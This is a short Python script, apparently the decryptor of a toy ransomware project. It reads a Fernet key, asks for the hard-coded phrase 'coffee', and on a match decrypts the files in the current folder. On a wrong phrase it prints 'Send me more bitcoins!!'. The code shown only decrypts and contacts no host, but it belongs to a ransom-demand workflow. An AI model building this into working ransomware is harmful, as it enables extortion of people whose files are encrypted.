#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files
files = []

for file in os.listdir():
    if file == "server.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key","rb") as key:
    secretkey = key.read()

secretPhrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretPhrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
    print(f"\n[+] Congratulations, all the files have been decrypted successfuly")
else:
    print(f"\n[!] Sorry! Wrong phrase. Send me more bitcoins!!")